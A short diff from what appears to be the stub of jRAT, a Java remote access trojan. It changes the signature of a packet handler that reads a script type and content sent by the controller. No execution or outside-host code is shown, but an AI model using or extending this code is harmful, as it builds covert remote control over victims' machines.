@@ -6,7 +6,7 @@ import se.jrat.stub.Connection;
 public class Packet35Script extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		String type = Connection.instance.readLine();
 		String content = Connection.instance.readLine();
 		
